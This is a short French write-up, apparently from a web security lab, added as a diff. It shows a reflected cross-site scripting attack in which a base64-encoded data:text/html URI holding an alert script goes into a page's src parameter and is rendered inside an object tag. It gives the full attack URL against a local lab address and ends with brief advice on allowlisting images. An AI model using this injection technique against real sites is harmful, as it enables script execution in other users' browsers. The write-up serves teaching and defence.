@@ -1,0 +1,12 @@
+Sur la page : /?page=media&src=nsa
+L'image nsa_prism.jpg est une image dans une balise object. dans le champ data il y a l'url de l'image transmise par le champ src de l'url de la page.
+dans le champ data, on peut mettre des donnees en base64. 
+en convertissant <script>alert("42")</script> en base64, ca nous donne : PHNjcmlwdD5hbGVydCgiNDIiKTwvc2NyaXB0Pg
+
+notre url finale : http://192.168.1.11/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiNDIiKTwvc2NyaXB0Pg
+
+
+Comment se proteger:
+
+Ne jamais utiliser directement les données de l'utilisateur.
+il vaut mieux demander au serveur d'envoyer les images d'apres une liste possible.
